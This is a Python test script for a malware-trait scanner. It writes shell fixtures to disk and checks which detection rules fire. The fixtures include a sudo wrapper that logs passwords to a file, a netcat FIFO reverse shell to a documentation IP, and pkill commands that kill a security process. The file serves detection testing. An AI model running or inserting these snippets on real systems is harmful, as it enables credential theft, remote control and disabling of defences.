"""Static-only controls: never execute the shell fixtures."""
import json
import os
from pathlib import Path
import subprocess
import sys

ROOT = Path(__file__).resolve().parents[2]
out = Path(sys.argv[1])
out.mkdir(parents=True, exist_ok=True)
phase = sys.argv[2]
cases = {
    'silent-password-helper.sh': '#!/bin/bash\ncommand_text="read -s password"\n',
    'pmd-suffix-legacy.sh': '#!/bin/sh\npkill -9 pmd-worker\n',
    'sudo-forwarder.sh': '''#!/bin/bash
sudo() {
    read -s -p "[sudo] password for $USER: " pass
    echo "$pass" | /usr/bin/sudo -S "$@"
}
''',
    'sudo-confirm.sh': '''#!/bin/bash
sudo() {
    read -p "Continue? " answer
    /usr/bin/sudo "$@"
}
''',
    'sudo-logger.sh': '''#!/bin/bash
sudo() {
    read -s -p "[sudo] password for $USER: " pass
    echo "$USER:$pass" >> /tmp/credentials.log
    echo "$pass" | /usr/bin/sudo -S "$@"
}
''',
    'pmd-legacy.sh': '#!/bin/sh\npkill -9 pmd\n',
    'pmd-full-command.sh': '#!/bin/sh\npgrep -f pmd && pkill -9 -f pmd\n',
    'pmd-other-target.sh': '#!/bin/sh\npgrep -f pmd\npkill -9 -f worker\n',
    'pmd-health.sh': '#!/bin/sh\npgrep -f pmd\n',
    'pmd-similar-name.sh': '#!/bin/sh\npkill -9 -f pmd-worker\n',
    'fifo-file-transfer.sh': '#!/bin/sh\nmkfifo /tmp/transfer\ncat /tmp/transfer | nc 192.0.2.1 443\n',
    'fifo-command-shell.sh': '#!/bin/sh\nmkfifo /tmp/session\ncat /tmp/session | /bin/bash -i 2>&1 | nc 192.0.2.1 443 >/tmp/session\n',
}
for name, source in cases.items():
    (out / name).write_text(source)
paths = [out / n for n in cases] + [
    ROOT / 'testdata/hostile/passwd-uid-zero-live.sh',
    ROOT / 'testdata/hostile/supply-chain-corpus/shell/shell-wicklowflow-zshrc-alias-capture-macos.sh',
    ROOT / 'testdata/benign/consented-sudo-install-controls.rs',
    ROOT / 'testdata/taxonomy/toolpass-shell-njrat-review/agent_payload.sh',
]
result = subprocess.run([os.environ.get('CLEAVE', 'cleave'), '--traits-dir', str(ROOT), '--format', 'json', *map(str, paths)], check=False, capture_output=True, text=True)
(out / (phase + '.json')).write_text(result.stdout)
if result.returncode:
    print(result.stderr)
    sys.exit(result.returncode)
decoder = json.JSONDecoder()
remaining = result.stdout
files = []
while remaining.strip():
    doc, end = decoder.raw_decode(remaining.lstrip())
    files.extend(doc.get('files', [doc]))
    remaining = remaining.lstrip()[end:]
rows = {Path(f['path']).name: {t['id']: t['crit'] for t in f.get('traits', [])} for f in files}
(out / (phase + '-traits.json')).write_text(json.dumps(rows, indent=2) + '\n')
if phase == 'before':
    print('Baseline saved for', len(rows), 'controls')
    sys.exit(0)
old_capture = 'objectives/credential-access/capture/input::shell-sudo-credential-interception'
new_capture = 'objectives/credential-access/capture/input::sudo-shell-password-interception'
kill = 'objectives/impact/degrade/edr/targeting::force-kill-pmd'
aggregate = 'objectives/impact/degrade/edr/targeting::edr-security-process-termination'
revshell = 'objectives/command-and-control/reverse-shell/netcat::nc-fifo-revshell'
for name in ['sudo-forwarder.sh', 'sudo-confirm.sh']:
    assert old_capture not in rows[name], (name, rows[name])
    assert new_capture not in rows[name]
for rule in [old_capture, new_capture]:
    assert rows['sudo-logger.sh'].get(rule) == 5, (rule, rows['sudo-logger.sh'])
for name in ['pmd-legacy.sh', 'pmd-full-command.sh']:
    assert rows[name].get(kill) == 4, (name, rows[name])
    assert rows[name].get(aggregate) == 4, (name, rows[name])
for name in ['pmd-other-target.sh', 'pmd-health.sh', 'pmd-similar-name.sh', 'pmd-suffix-legacy.sh']:
    assert kill not in rows[name], (name, rows[name])
    assert aggregate not in rows[name]
assert rows['silent-password-helper.sh'].get('micro-behaviors/ui/dialog/prompt::read-silent-password') == 3
assert rows['fifo-command-shell.sh'].get(revshell) == 5
assert revshell not in rows['fifo-file-transfer.sh']
assert rows['passwd-uid-zero-live.sh'].get('objectives/persistence/login/account/create::root-account-database-implant') == 5
# Compare all outside-batch controls, allowing only documented relocations.
before = json.loads((out / 'before-traits.json').read_text())
mapping = json.loads((ROOT / 'testdata/cl-unk-second-review/relocations.json').read_text())
for name in rows:
    if name in cases:
        continue
    expected = {mapping.get(rule, rule): crit for rule, crit in before[name].items()}
    assert rows[name] == expected, (name, set(expected) - set(rows[name]), set(rows[name]) - set(expected))
print('PASS:', len(rows), 'controls; capture, target binding, reverse shell, retained external fixtures')
